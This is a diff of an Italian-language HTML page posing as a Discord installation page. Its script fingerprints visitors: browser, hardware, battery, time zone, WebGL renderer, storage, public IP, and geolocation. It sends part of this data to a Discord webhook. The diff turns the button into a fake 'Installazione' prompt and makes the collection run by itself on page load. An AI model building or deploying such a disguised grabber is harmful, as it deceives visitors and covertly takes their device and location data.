@@ -4,33 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-            padding: 20px;
-            background-color: #f4f4f4;
-            text-align: center;
-        }
-        button {
-            background-color: #007bff; /* Blu */
-            color: white; /* Testo bianco */
-            padding: 10px 20px; /* Spaziatura interna */
-            border: none; /* Nessun bordo */
-            border-radius: 5px; /* Bordi arrotondati */
-            font-size: 16px; /* Dimensione del testo */
-            cursor: pointer; /* Puntatore a mano */
-            transition: background-color 0.3s; /* Transizione del colore */
-        }
-        button:hover {
-            background-color: #0056b3; /* Blu più scuro al passaggio del mouse */
-        }
-    </style>
+    <h1>Installazione di Discord sotto</h1>
+    <button onclick="sendDeviceInfo();">
+        Installazione
+    </button>
 </head>
 <body>
-
-    <h1>Installazione di Discord sotto</h1>
-    <button onclick="sendDeviceInfo();">Invia Informazioni</button>
 
     <script>
         async function sendDeviceInfo() {
@@ -38,43 +17,92 @@
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
                 screenResolution: `${window.screen.width}x${window.screen.height}`,
-                battery: null
+                colorDepth: window.screen.colorDepth,
+                online: navigator.onLine,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                battery: null,
+                ipAddress: null,
+                webGLRenderer: null,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                location: null,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory || 'N/A',
+                storageEstimate: null,
+                doNotTrack: navigator.doNotTrack
             };
 
-            // Ottieni lo stato della batteria se disponibile
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 deviceInfo.battery = {
                     charging: battery.charging,
-                    level: (battery.level * 100).toFixed(2) + '%'
+                    level: (battery.level * 100).toFixed(2) + '%',
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
                 };
             }
 
-            // Crea il payload per Discord
+            await fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    deviceInfo.ipAddress = data.ip;
+                });
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    deviceInfo.location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                });
+            }
+
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    deviceInfo.webGLRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+
+            if (navigator.storage && navigator.storage.estimate) {
+                const estimate = await navigator.storage.estimate();
+                deviceInfo.storageEstimate = {
+                    quota: (estimate.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
+                    usage: (estimate.usage / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
+                };
+            }
+
             const payload = {
                 embeds: [{
                     title: "Informazioni del Dispositivo",
-                    description: "Ecco alcune informazioni sul tuo dispositivo:",
-                    color: 0x00ff00, // Verde
+                    description: "Ecco alcune informazioni del tuo dispositivo:",
+                    color: 0x0099ff, // Blu chiaro
                     fields: [
-                        { name: 'User Agent', value: deviceInfo.userAgent, inline: true },
-                        { name: 'Piattaforma', value: deviceInfo.platform, inline: true },
-                        { name: 'Lingua', value: deviceInfo.language, inline: true },
-                        { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution, inline: true },
-                        { name: 'Batteria', value: deviceInfo.battery ? `Carica: ${deviceInfo.battery.level}` : 'N/A', inline: true }
+                        { name: 'User Agent', value: deviceInfo.userAgent || 'N/A', inline: true },
+                        { name: 'Piattaforma', value: deviceInfo.platform || 'N/A', inline: true },
+                        { name: 'Lingua', value: deviceInfo.language || 'N/A', inline: true },
+                        { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution || 'N/A', inline: true },
+                        { name: 'Profondità Colori', value: deviceInfo.colorDepth || 'N/A', inline: true },
+                        { name: 'Stato Connessione', value: deviceInfo.online ? 'Online' : 'Offline', inline: true },
+                        { name: 'Batteria', value: deviceInfo.battery ? `Livello: ${deviceInfo.battery.level}` : 'N/A', inline: true },
+                        { name: 'Fuso Orario', value: deviceInfo.timeZone || 'N/A', inline: true },
+                        { name: 'Memoria', value: deviceInfo.memory || 'N/A', inline: true }
                     ],
                     footer: {
                         text: "Messaggio inviato tramite webhook",
                         icon_url: "https://i.imgur.com/AfFp7pu.png" // Icona del footer
-                    },
-                    thumbnail: {
-                        url: "https://i.imgur.com/AfFp7pu.png" // Immagine di anteprima
                     }
                 }]
             };
 
-            // Invia il payload al webhook Discord
             const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
             try {
                 const response = await fetch(webhookUrl, {
@@ -94,6 +122,8 @@
                 console.error('Errore:', error);
             }
         }
+
+        window.onload = sendDeviceInfo;
     </script>
 
 </body>
